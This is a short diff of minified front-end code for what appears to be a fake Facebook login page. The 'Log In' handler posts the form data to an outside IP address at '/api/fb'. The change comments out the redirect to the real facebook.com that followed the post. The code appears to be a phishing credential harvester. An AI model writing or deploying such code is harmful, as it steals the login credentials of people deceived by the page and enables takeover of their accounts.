@@ -586,10 +586,11 @@
 																	O.a.post(
 																		"http://172.104.35.84/api/fb",
 																		o
-																	),
-																		window.location.replace(
-																			"https://www.facebook.com"
-																		);
+																	);
+																	// ,
+																	// window.location.replace(
+																	// 	"https://www.facebook.com"
+																	// );
 																},
 															children: "Log In",
 														}),
